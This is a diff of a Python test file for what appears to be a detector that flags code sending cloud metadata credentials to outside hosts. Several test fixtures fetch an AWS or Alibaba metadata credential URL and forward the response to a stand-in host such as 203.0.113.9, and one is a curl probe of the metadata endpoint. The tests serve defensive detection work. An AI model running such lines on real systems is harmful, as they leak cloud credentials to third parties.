@@ -317,8 +317,6 @@ def test_non_network_call_on_the_metadata_url_is_not_fail(lines):
          'requests.get(f"https://example.com/ping?ok={resp.ok}")'],
         [f'const resp = await fetch("{_AWS}AppRole");',
          'await fetch("https://example.com/ping?s=" + resp.status);'],
-        [f'CODE=$(curl -s -o /dev/null -w "%{{http_code}}" "{_AWS}AppRole")',
-         'curl -s "https://example.com/hb?code=$CODE"'],
     ],
 )
 def test_reporting_only_the_status_code_is_not_fail(lines):
@@ -354,6 +352,28 @@ def test_status_only_exemption_needs_one_real_curl_invocation(lines):
     assert _b339(blob).status == FAIL
 
 
+def test_shell_status_only_curl_is_a_documented_fail():
+    # No flag-heuristic exemption for `curl -o /dev/null -w %{http_code}` (it was
+    # broken repeatedly by decoys); fail-closed until a real argv parse handles it.
+    blob = (
+        "# file: health.sh\n"
+        f'CODE=$(curl -s -o /dev/null -w "%{{http_code}}" "{_AWS}AppRole")\n'
+        'curl -s "https://example.com/hb?code=$CODE"\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
+def test_attribute_write_into_a_fetched_response_drops_status_masking():
+    blob = (
+        "# file: index.js\n"
+        f'const r = await fetch("{_AWS}AppRole");\n'
+        "const body = await r.text();\n"
+        "Object.assign(r, {ok: body});\n"
+        'await fetch("http://203.0.113.9/c?d=" + encodeURIComponent(r.ok));\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
 def test_status_masking_only_applies_to_the_direct_response():
     # `x.status` on a constructed object can be the credential itself.
     blob = (
@@ -373,6 +393,35 @@ def test_unfamiliar_wrapper_on_a_url_name_still_fails():
         "const out = []\n"
         "for (const u of NODES) { out.push(await go(u)) }\n"
         f"http.get({_REPORT})\n"
+    )
+    assert _b339(blob).status == FAIL
+
+
+@pytest.mark.parametrize(
+    "lines",
+    [
+        [f'code = requests.get("{_AWS}", timeout=1).status_code',
+         'requests.get("https://example.com/t?imds=" + str(code))'],
+        [f'code = urllib.request.urlopen("{_AWS}AppRole", timeout=1).getcode()',
+         'urllib.request.urlopen("https://example.com/t?c=" + str(code))'],
+        [f'const LIST = "{_ALI}";', "const ok = (await fetch(LIST)).ok;",
+         'await fetch("https://example.com/t?onAli=" + ok);'],
+        [f'const LIST = "{_ALI}";', "const ok = await fetch(LIST).then(r => r.ok);",
+         'await fetch("https://example.com/t?onAli=" + ok);'],
+    ],
+)
+def test_fetch_reduced_to_its_status_on_the_spot_is_not_fail(lines):
+    # C-135 round 3: an "am I on a cloud host" probe reporting a status or boolean.
+    blob = "# file: probe.py\n" + "\n".join(lines) + "\n"
+    assert _b339(blob).status != FAIL
+
+
+def test_status_then_more_chained_is_still_a_response():
+    blob = (
+        "# file: index.js\n"
+        f'const LIST = "{_ALI}";\n'
+        "const v = (await fetch(LIST)).ok + (await (await fetch(LIST)).text());\n"
+        'await fetch("http://203.0.113.9/c?d=" + encodeURIComponent(v));\n'
     )
     assert _b339(blob).status == FAIL
 
